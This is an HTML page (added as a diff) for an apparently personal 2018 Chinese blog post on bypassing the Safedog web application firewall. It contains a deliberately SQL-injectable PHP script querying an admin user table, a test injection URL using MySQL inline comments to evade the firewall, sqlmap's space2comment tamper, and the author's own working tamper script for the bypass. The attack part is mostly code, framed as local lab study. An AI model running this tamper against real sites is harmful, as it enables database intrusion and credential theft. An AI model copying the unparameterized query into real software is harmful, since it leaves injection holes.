@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="theme-color" content="#494f5c">
+	<meta name="msapplication-TileColor" content="#494f5c">
+
+<meta itemprop="name" content="安全狗bypass">
+<meta itemprop="description" content="前言 最近在学习waf的绕过,中间遇到不同的坑,后来学习下sqlmap中tamper的写法,膜拜sqlmap的作者, tamper的写法很丰富,也很方便
+安全狗的绕过 自己本地搭建了最新版本的安全狗,利用mysql的内联注释,继续bypass
+环境准备  PHP 5.4.5 Mysql 5.5 Apache 2.2.0  利用替换空白字符&quot; &quot; == &quot;/**!50000xxx**/&quot;的方法 bypass
+注入源码 show.php
+&lt;?php include_once(&#34;./config/config_db.php&#34;); include_once(&#34;./config/db_init.php&#34;); $db = new DB($config); $id = $_GET[&#34;id&#34;]; if (isset($id)){ $sql= &#34;select user_name,email,password from ecs_admin_user where user_id = {$id}&#34;; echo $sql.&#34;&lt;br&gt;&#34;; @$result = $db-&gt;select($sql); if (count($result[0])&gt;1){ echo $result[0][0].&#34; okokok&lt;br&gt;&#34;; echo $result[0][1].&#34;&lt;br&gt;&#34;; echo $result[0][2].&#34;&lt;br&gt;&#34;; }else{ echo &#34;fuck&#34;; } } ?&gt;  本地搭建的环境尝试
+http://192.168.56.101/show.php?id=1/**!5000xxx**/and/**!50000xxx**/1/**!50000xxx**/=1 好了,知道安全狗对关键词之间检测那么我们可以在其空白字符和= ()这些字符之间插入我们这个注释来绕过
+tamper的编写 我们观察sqlmap自带的tamper来观察如何绕过">
+
+
+<meta itemprop="datePublished" content="2018-06-25T14:05:01&#43;08:00" />
+<meta itemprop="dateModified" content="2018-06-25T14:05:01&#43;08:00" />
+<meta itemprop="wordCount" content="368">
+
+  <meta itemprop="image" content="https://picsum.photos/1024/768/?random">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta property="og:title" content="安全狗bypass" />
+<meta property="og:description" content="前言 最近在学习waf的绕过,中间遇到不同的坑,后来学习下sqlmap中tamper的写法,膜拜sqlmap的作者, tamper的写法很丰富,也很方便
+安全狗的绕过 自己本地搭建了最新版本的安全狗,利用mysql的内联注释,继续bypass
+环境准备  PHP 5.4.5 Mysql 5.5 Apache 2.2.0  利用替换空白字符&quot; &quot; == &quot;/**!50000xxx**/&quot;的方法 bypass
+注入源码 show.php
+&lt;?php include_once(&#34;./config/config_db.php&#34;); include_once(&#34;./config/db_init.php&#34;); $db = new DB($config); $id = $_GET[&#34;id&#34;]; if (isset($id)){ $sql= &#34;select user_name,email,password from ecs_admin_user where user_id = {$id}&#34;; echo $sql.&#34;&lt;br&gt;&#34;; @$result = $db-&gt;select($sql); if (count($result[0])&gt;1){ echo $result[0][0].&#34; okokok&lt;br&gt;&#34;; echo $result[0][1].&#34;&lt;br&gt;&#34;; echo $result[0][2].&#34;&lt;br&gt;&#34;; }else{ echo &#34;fuck&#34;; } } ?&gt;  本地搭建的环境尝试
+http://192.168.56.101/show.php?id=1/**!5000xxx**/and/**!50000xxx**/1/**!50000xxx**/=1 好了,知道安全狗对关键词之间检测那么我们可以在其空白字符和= ()这些字符之间插入我们这个注释来绕过
+tamper的编写 我们观察sqlmap自带的tamper来观察如何绕过" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/%E5%AE%89%E5%85%A8%E7%8B%97/" />
+
+<meta property="og:image" content="https://picsum.photos/1024/768/?random" />
+<meta property="article:published_time" content="2018-06-25T14:05:01&#43;08:00"/>
+<meta property="article:modified_time" content="2018-06-25T14:05:01&#43;08:00"/>
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://picsum.photos/1024/768/?random"/>
+
+<meta name="twitter:title" content="安全狗bypass"/>
+<meta name="twitter:description" content="前言 最近在学习waf的绕过,中间遇到不同的坑,后来学习下sqlmap中tamper的写法,膜拜sqlmap的作者, tamper的写法很丰富,也很方便
+安全狗的绕过 自己本地搭建了最新版本的安全狗,利用mysql的内联注释,继续bypass
+环境准备  PHP 5.4.5 Mysql 5.5 Apache 2.2.0  利用替换空白字符&quot; &quot; == &quot;/**!50000xxx**/&quot;的方法 bypass
+注入源码 show.php
+&lt;?php include_once(&#34;./config/config_db.php&#34;); include_once(&#34;./config/db_init.php&#34;); $db = new DB($config); $id = $_GET[&#34;id&#34;]; if (isset($id)){ $sql= &#34;select user_name,email,password from ecs_admin_user where user_id = {$id}&#34;; echo $sql.&#34;&lt;br&gt;&#34;; @$result = $db-&gt;select($sql); if (count($result[0])&gt;1){ echo $result[0][0].&#34; okokok&lt;br&gt;&#34;; echo $result[0][1].&#34;&lt;br&gt;&#34;; echo $result[0][2].&#34;&lt;br&gt;&#34;; }else{ echo &#34;fuck&#34;; } } ?&gt;  本地搭建的环境尝试
+http://192.168.56.101/show.php?id=1/**!5000xxx**/and/**!50000xxx**/1/**!50000xxx**/=1 好了,知道安全狗对关键词之间检测那么我们可以在其空白字符和= ()这些字符之间插入我们这个注释来绕过
+tamper的编写 我们观察sqlmap自带的tamper来观察如何绕过"/>
+
+	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+	<link rel="shortcut icon" href="/favicon.ico">
+
+	<title>安全狗bypass</title>
+	<link rel="stylesheet" href="/css/style.min.31706917653d2b9e8410abd431f30ec4359a88a94fc87a63654779d87329edec.css" integrity="sha256-MXBpF2U9K56EEKvUMfMOxDWaiKlPyHpjZUd52HMp7ew=">
+	<style>.bg-img {background-image: url('https://picsum.photos/1024/768/?random');}</style>
+</head>
+
+<body id="page">
+	
+	<header id="site-header" class="animated slideInUp faster">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="/">Liod &#39;s Blog</a>
+				</div>
+				<nav class="site-nav hide-in-mobile">
+					<a href="/posts/">Posts</a>
+					<a href="/about/">About</a>
+					<a href="/friends/">Friends</a>
+				</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<button id="img-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-image"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg></button><span class="hdr-social hide-in-mobile"><a href="https://github.com/liodair" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="/posts/">Posts</a></li>
+			<li><a href="/about/">About</a></li>
+			<li><a href="/friends/">Friends</a></li>
+		</ul>
+	</div>
+
+
+	<div class="bg-img"></div>
+	<main class="site-main section-inner animated fadeIn faster">
+		<article class="thin">
+			<header class="post-header">
+				<div class="post-meta"><span>Jun 25, 2018</span></div>
+				<h1>安全狗bypass</h1>
+			</header>
+			<div class="content">
+				
+
+<h1 id="前言">前言<a href="#前言" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h1>
+
+<p>最近在学习waf的绕过,中间遇到不同的坑,后来学习下<code>sqlmap</code>中<code>tamper</code>的写法,膜拜sqlmap的作者,
+<code>tamper</code>的写法很丰富,也很方便</p>
+
+<h2 id="安全狗的绕过">安全狗的绕过<a href="#安全狗的绕过" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+
+<p>自己本地搭建了最新版本的安全狗,利用<code>mysql</code>的内联注释,继续bypass</p>
+
+<h3 id="环境准备">环境准备<a href="#环境准备" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+
+<ul>
+<li>PHP    5.4.5</li>
+<li>Mysql  5.5</li>
+<li>Apache 2.2.0</li>
+</ul>
+
+<p>利用替换空白字符<code>&quot; &quot; == &quot;/**!50000xxx**/&quot;</code>的方法 bypass</p>
+
+<p>注入源码 show.php</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">include_once</span><span class="p">(</span><span class="s2">&#34;./config/config_db.php&#34;</span><span class="p">);</span>
+<span class="k">include_once</span><span class="p">(</span><span class="s2">&#34;./config/db_init.php&#34;</span><span class="p">);</span>
+<span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DB</span><span class="p">(</span><span class="nv">$config</span><span class="p">);</span>
+<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">];</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$id</span><span class="p">)){</span>
+	<span class="nv">$sql</span><span class="o">=</span> <span class="s2">&#34;select user_name,email,password from ecs_admin_user where user_id = </span><span class="si">{</span>$id<span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>
+	<span class="k">echo</span> <span class="nv">$sql</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+	<span class="o">@</span><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">select</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">){</span>
+	<span class="k">echo</span> <span class="nv">$result</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34; okokok&lt;br&gt;&#34;</span><span class="p">;</span>
+	<span class="k">echo</span> <span class="nv">$result</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+	<span class="k">echo</span> <span class="nv">$result</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+	<span class="k">echo</span> <span class="s2">&#34;fuck&#34;</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+<p>本地搭建的环境尝试</p>
+
+<p><code>http://192.168.56.101/show.php?id=1/**!5000xxx**/and/**!50000xxx**/1/**!50000xxx**/=1</code>
+<img src="http://image.3001.net/images/20180809/15338057453159.png" alt="" /></p>
+
+<p>好了,知道安全狗对关键词之间检测那么我们可以在其空白字符和= ()这些字符之间插入我们这个注释来绕过</p>
+
+<h2 id="tamper的编写">tamper的编写<a href="#tamper的编写" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+
+<p>我们观察<code>sqlmap</code>自带的<code>tamper</code>来观察如何绕过</p>
+
+<p><code>tamper /space2comment.py</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
+
+<span class="s2">&#34;&#34;&#34;
+</span><span class="s2">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
+</span><span class="s2">See the file &#39;LICENSE&#39; for copying permission
+</span><span class="s2">&#34;&#34;&#34;</span>
+
+<span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
+
+<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span>
+
+<span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
+    <span class="k">pass</span>
+
+<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>  <span class="c1">#这里可以看到传入的payload进行字符替换或增加</span>
+    <span class="s2">&#34;&#34;&#34;
+</span><span class="s2">    Replaces (MySQL) instances of space character (&#39; &#39;) with comments &#39;/**_**/&#39;
+</span><span class="s2">
+</span><span class="s2">    Tested against:
+</span><span class="s2">        * MySQL 5.0 and 5.5
+</span><span class="s2">
+</span><span class="s2">    Notes:
+</span><span class="s2">        * Useful to bypass weak and bespoke web application firewalls
+</span><span class="s2">
+</span><span class="s2">    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
+</span><span class="s2">    &#39;SELECT/**_**/id/**_**/FROM/**_**/users&#39;
+</span><span class="s2">    &#34;&#34;&#34;</span>
+
+    <span class="n">retVal</span> <span class="o">=</span> <span class="n">payload</span>
+
+    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
+        <span class="n">retVal</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+        <span class="n">quote</span><span class="p">,</span> <span class="n">doublequote</span><span class="p">,</span> <span class="n">firstspace</span> <span class="o">=</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">False</span> <span class="c1">#首个字符替换,双引号,</span>
+
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">firstspace</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">isspace</span><span class="p">():</span>
+                    <span class="n">firstspace</span> <span class="o">=</span> <span class="bp">True</span>
+                    <span class="n">retVal</span> <span class="o">+=</span> <span class="s2">&#34;/**_**/&#34;</span> <span class="c1">#替换为 &#34;/**_**/&#34;</span>
+                    <span class="k">continue</span>
+
+            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">:</span>
+                <span class="n">quote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">quote</span>
+
+            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">:</span>
+                <span class="n">doublequote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">doublequote</span>
+
+            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34; &#34;</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">doublequote</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
+                <span class="n">retVal</span> <span class="o">+=</span> <span class="s2">&#34;/**_**/&#34;</span>
+                <span class="k">continue</span>
+
+            <span class="n">retVal</span> <span class="o">+=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+
+    <span class="k">return</span> <span class="n">retVal</span></code></pre></div>
+<p>看了以后我们就知道了该怎么做了,因此这是我编写的<code>tamper</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
+
+<span class="s2">&#34;&#34;&#34;
+</span><span class="s2">Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
+</span><span class="s2">See the file &#39;doc/COPYING&#39; for copying permission
+</span><span class="s2">&#34;&#34;&#34;</span>
+
+<span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
+
+<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span>
+
+<span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
+    <span class="k">pass</span>
+
+<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+    <span class="s2">&#34;&#34;&#34;
+</span><span class="s2">    Replaces space character (&#39; &#39;) with comments &#39;/**/&#39;
+</span><span class="s2">
+</span><span class="s2">    Tested against:
+</span><span class="s2">        * MySQL &gt; 5.1
+</span><span class="s2">
+</span><span class="s2">    Notes:
+</span><span class="s2">        * Useful to bypass weak and bespoke web application firewalls
+</span><span class="s2">
+</span><span class="s2">    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
+</span><span class="s2">    &#39;SELECT/**!50000xxx**/id/**!50000xxx**/FROM/**!50000xxx**/users&#39;
+</span><span class="s2">    &#34;&#34;&#34;</span>
+
+    <span class="n">retVal</span> <span class="o">=</span> <span class="n">payload</span>
+
+    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
+        <span class="n">retVal</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+        <span class="n">quote</span><span class="p">,</span> <span class="n">doublequote</span><span class="p">,</span> <span class="n">firstspace</span> <span class="o">=</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">False</span>
+        <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;DATABASE&#34;</span><span class="p">,</span> <span class="s2">&#34;SCHEMA&#34;</span><span class="p">)</span>
+
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">firstspace</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">isspace</span><span class="p">():</span>
+                    <span class="n">firstspace</span> <span class="o">=</span> <span class="bp">True</span>
+                    <span class="n">retVal</span> <span class="o">+=</span> <span class="s2">&#34;/**!50000xxx**/&#34;</span>
+                    <span class="k">continue</span>
+
+            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">:</span>
+                <span class="n">quote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">quote</span>
+
+            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">:</span>
+                <span class="n">doublequote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">doublequote</span>
+
+            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34; &#34;</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">doublequote</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
+                <span class="n">retVal</span> <span class="o">+=</span> <span class="s2">&#34;/**!50000xxx**/&#34;</span>
+
+            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;=&#34;</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">doublequote</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
+                <span class="n">retVal</span> <span class="o">+=</span> <span class="s2">&#34;/**!50000xxx**/=&#34;</span>
+            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;(&#34;</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">doublequote</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
+                <span class="n">retVal</span> <span class="o">+=</span> <span class="s2">&#34;/**!50000xxx**/(&#34;</span>
+                <span class="k">continue</span>
+
+            <span class="n">retVal</span> <span class="o">+=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+
+
+
+    <span class="k">return</span> <span class="n">retVal</span></code></pre></div>
+<p>附上自己sqlmap的截图
+<img src="http://image.3001.net/images/20180809/15338072328221.png" alt="" /></p>
+
+<h3 id="参考来源">参考来源<a href="#参考来源" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+
+<p><a href="https://www.secquan.org/Share/1045">https://www.secquan.org/Share/1045</a></p>
+
+			</div>
+			<hr class="post-end">
+			<footer class="post-info">
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg></p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2018-06-25 14:05 &#43;0800</p>
+			</footer>
+		</article>
+		<div class="post-nav thin">
+			<a class="next-post" href="/posts/post-with-featured-image/">
+				<span class="post-nav-label"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>&nbsp;</span><br><span>Post With Featured Image</span>
+			</a>
+			<a class="prev-post" href="/posts/hello/">
+				<span class="post-nav-label">&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>Angular-xss</span>
+			</a>
+		</div>
+		<div id="comments" class="thin">
+</div>
+	</main>
+
+	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+		<p>&copy; 2019 <a href="/">Lioders</a> &#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
+		<p>
+			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+		</p>
+	</footer>
+
+
+	<script src="/js/main.min.784417f5847151f848c339cf0acb13a06cbb648b1483435a28ed4556c4ead69b.js" integrity="sha256-eEQX9YRxUfhIwznPCssToGy7ZIsUg0NaKO1FVsTq1ps="></script>
+
+</body>
+
+</html>
